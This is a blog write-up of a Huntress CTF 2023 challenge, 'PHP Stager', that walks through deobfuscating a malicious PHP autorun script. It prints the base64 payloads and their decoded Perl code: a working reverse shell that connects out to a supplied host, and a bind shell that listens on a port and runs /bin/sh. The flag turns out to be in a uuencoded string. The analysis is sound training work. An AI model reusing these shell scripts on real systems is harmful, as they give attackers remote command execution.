---
title: "PHP Stager"
date: 2023-10-06T13:11:20-10:01
#draft: true
tags: ['CTF','Writeups', 'Malware', 'Easy']
---
 
# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Easy Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/dialtone)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/layered_security) 

### Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?


For this challenge we are given a file to download named 'phonetic'. Inspecting the file we can see that is is a PHP script that has been obfuscated.

After decoding some of the base64 encoded text, we found that we could modify some lines after the large blob of encoded text like so:

Unmodified:
```php
$fsPwhnfn8423 = "";
$oZjuNUpA325 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/

$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
$c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
$c();
```
### Note: we renamed the variable for the large blob to $b64str_2:
Modified:
```php
$b64decode = "";
$strrev = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $b64decode .= $lBuAnNeu5282[$k];
}
#echo $b64decode;
foreach([26,16,14,14,31,33] as $k){
   $strrev .= $lBuAnNeu5282[$k];
}

/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/

$c = base64_decode( deGRi(base64_decode($b64str_2), "tVEwfwrN302"));
$c();
```
The resulting output is a script which is further obfuscated with base64 encoding. We then moved on to decoding this variable:
```html
$back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
```
This decoded to a perl script:
```perl
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)    
```
and the the other variable in the same function:
```html
$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<h1>Network tools</h1><div class=content>
```
decoded to:
```perl
#!/usr/bin/perl
$SHELL="/bin/sh -i";
if (@ARGV < 1) { exit(1); }
use Socket;
socket(S,&PF_INET,&SOCK_STREAM,getprotobyname('tcp')) || die "Cant create socket\n";
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
bind(S,sockaddr_in($ARGV[0],INADDR_ANY)) || die "Cant open port\n";
listen(S,3) || die "Cant listen port\n";
while(1) {
	accept(CONN,S);
	if(!($pid=fork)) {
		die "Cannot fork" if (!defined $pid);
		open STDIN,"<&CONN";
		open STDOUT,">&CONN";
		open STDERR,">&CONN";
		exec $SHELL || die print CONN "Cant execute $SHELL\n";
		close CONN;
		exit 0;
	}
}  
```
However, we did not find anything useful in this section. We then went back and noticed the 'uuencode' section and decided to run it through this [decode tool](https://www.dcode.fr/uu-encoding), which allowed us to retrieve the flag!


![stager1](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/stager.png?raw=true)

Alternatively, you could also do this in the command line using uudecode. We installed the utility via this command:
```bash
sudo apt install sharutils
```
Then paste in the encoded string to a file with the .uu extension:  
Example: encoded.uu
```bash
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
```
Then run uudecode on the file. This was giving me a fatal error for some reason, but was still outputting the flag to uuencode.uu file:
```bash
uudecode encoded.uu
```
You can then cat the output uuencode.uu file to retrieve the flag that way!

![stager2](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/stager2.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/dialtone)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/layered_security) 